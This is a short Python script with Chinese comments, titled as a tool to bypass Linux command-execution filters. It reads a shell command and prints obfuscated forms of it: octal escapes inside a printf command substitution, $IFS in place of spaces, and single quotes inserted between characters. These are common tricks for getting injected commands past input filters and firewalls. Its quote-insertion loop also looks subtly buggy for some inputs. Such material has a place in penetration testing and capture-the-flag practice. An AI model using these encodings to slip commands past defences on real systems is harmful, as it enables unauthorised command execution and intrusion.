# -*- coding: UTF-8 -*-
'''
作者：Truda
功能：Bypass Linux 命令执行
'''

def bypass():
    # printf 8 进制
    command_8 = []
    for c in command:
        c = oct(ord(c)).replace('0o', "\\")
        command_8.append(c)

    encode_command1 = '$(printf "%s")' % "".join(command_8)
    encode_command2 = '$(printf$IFS"%s")' % "".join(command_8)
    print(encode_command1, "\n")
    print(encode_command2, "\n")

    # 加单引号
    command_3 = [i for i in command]
    for i in range(1, len(command_3) + 1, 2):
        command_3[i] = "'%s'" % command_3[i]
    encode_command_3 = "".join(command_3)
    print(encode_command_3, "\n")

    # 替换空格
    space = "$IFS"
    command_remove_space = command.replace(" ", space)
    print(command_remove_space, "\n")


if __name__ == "__main__":
    # command = ""
    command = input("🎃Command:")
    bypass()